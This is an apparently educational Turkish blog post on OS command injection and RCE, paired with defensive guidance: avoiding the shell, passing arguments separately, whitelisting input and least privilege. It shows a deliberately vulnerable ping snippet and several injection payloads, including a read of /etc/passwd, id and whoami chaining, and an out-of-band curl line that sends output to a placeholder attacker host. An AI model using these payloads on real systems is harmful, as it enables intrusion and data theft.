---
title: "Command Injection ve RCE: Sunucuda Komut Çalıştırmak"
date: 2026-07-03 10:00:00 +0300
tags: [command-injection, rce, web-security, siber-guvenlik, owasp]
author: CyEn07
---

**OS Command Injection**, kullanıcı girdisinin doğrudan bir işletim sistemi
komutuna dahil edilmesiyle oluşur ve genellikle en yıkıcı sonuca —
**Remote Code Execution (RCE)**, yani sunucuda uzaktan komut çalıştırma —
götürür. Sunucuda komut çalıştırabilen bir saldırgan, pratikte o makineyi ele
geçirmiş sayılır.

> Bu içerik yalnızca eğitim ve savunma amaçlıdır. Anlatılanları yalnızca kendi
> laboratuvarında veya yazılı izinli testlerde uygula.

## Nasıl Oluşur?

Uygulama, bir sistem komutunu kullanıcı girdisiyle birleştirip kabuğa
(shell) gönderdiğinde risk doğar. Örneğin bir "ping aracı":

```python
# TEHLIKELI
host = request.args.get("host")
os.system("ping -c 1 " + host)
```

Kullanıcı `host` yerine şunu girerse:

```
8.8.8.8; cat /etc/passwd
```

Kabuk iki komutu da çalıştırır: önce ping, sonra `cat /etc/passwd`. Zincirleme
için kullanılan tipik kabuk metakarakterleri:

```
;   &&   ||   |   `...`   $(...)   >   <   &
```

Örnek payload'lar:

```
8.8.8.8 && whoami
8.8.8.8 | id
8.8.8.8`id`
8.8.8.8$(id)
```

## Kör (Blind) Command Injection

Çıktı ekrana yansımıyorsa saldırgan yine de sonucu **kanıtlayabilir**:

- **Zaman tabanlı:** `; sleep 10` — yanıt 10 sn gecikirse enjeksiyon vardır.
- **Out-of-band (OOB):** `; curl http://saldirgan.tld/$(whoami)` — saldırgan
  kendi sunucusunun loglarında sonucu görür (DNS/HTTP sızıntısı).

## İlişkili: Diğer Enjeksiyon/RCE Yolları

Command injection tek RCE yolu değildir. Sık görülen akrabaları:

- **Insecure deserialization** (güvensiz nesne çözme)
- **Template injection (SSTI)** — `{{7*7}}` gibi ifadelerin sunucuda işlenmesi
- **Güvensiz dosya yükleme** ile web shell yerleştirme
- Zafiyetli kütüphane/bağımlılık (bilinen CVE'ler)

## Korunma Yöntemleri

### 1. Kabuğu Hiç Çağırma

En güçlü savunma: sistem komutu yerine dilin native API'sini kullan. Ağ
kontrolü için `os.system("ping ...")` yerine bir socket kütüphanesi kullan.

### 2. Kabuk Gerekiyorsa — Argümanları Ayır

Komutu string olarak birleştirme; argüman dizisi olarak geçir ve kabuğu
devreden çıkar:

```python
# Daha guvenli: shell=False, argumanlar ayrik
subprocess.run(["ping", "-c", "1", host], shell=False)
```

Böylece `host` içindeki `;` veya `|` yeni bir komut değil, düz argüman olur.

### 3. Girdi Doğrulama (Beyaz Liste)

Beklenen format neyse ona zorla — ör. bir IP/host için katı bir regex:

```
^[a-zA-Z0-9.\-]+$
```

Kara liste ("şu karakterleri sil") yaklaşımından kaçın; neredeyse her zaman
atlatılır.

### 4. Derinlemesine Savunma

| Önlem | Faydası |
|---|---|
| En az yetki (least privilege) | Uygulama root değil, kısıtlı kullanıcıyla çalışsın |
| Sandbox / container izolasyonu | RCE olsa bile etki alanını sınırlar |
| Çıkış (egress) firewall | OOB sızıntısını ve pivot'u zorlaştırır |
| WAF | Bilinen payload kalıplarını yakalar (tek başına yeterli değil) |

## Sonuç

Command injection'ın kökü, "veri"nin bir kabuk tarafından "komut" olarak
yorumlanmasıdır. En temiz çözüm kabuğu tamamen devreden çıkarıp parametreleri
API seviyesinde ayrık geçirmek, buna ek olarak en az yetki ve izolasyonla
olası bir RCE'nin etkisini sınırlamaktır.
